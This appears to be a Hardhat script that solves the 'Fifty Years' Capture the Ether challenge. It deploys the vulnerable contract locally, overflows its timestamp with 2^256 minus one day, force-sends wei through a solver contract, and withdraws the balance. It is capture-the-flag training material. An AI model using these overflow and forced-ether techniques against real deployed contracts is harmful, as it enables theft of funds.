import { ethers } from "hardhat";

async function main() {
  const [owner] = await ethers.getSigners();
  const amount = ethers.parseEther("1");

  // deploy contract
  const factory = await ethers.getContractFactory("FiftyYearsChallenge");
  const contract = await factory.deploy(owner.address, { value: amount });
  await contract.waitForDeployment();

  // cause an overflow
  const overflow = BigInt("2") ** BigInt("256") - BigInt(24 * 60 * 60);

  let transaction = await contract.upsert("1", overflow, { value: "1" });
  await transaction.wait();

  transaction = await contract.upsert("2", "0", { value: "2" });

  // solver contract to send 2 wei
  const solveFactory = await ethers.getContractFactory("FiftyYearsSolver");
  const solveContract = await solveFactory.deploy(contract.target, {
    value: "2",
  });
  await solveContract.waitForDeployment();

  const withdraw = await contract.withdraw(2);
  await withdraw.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
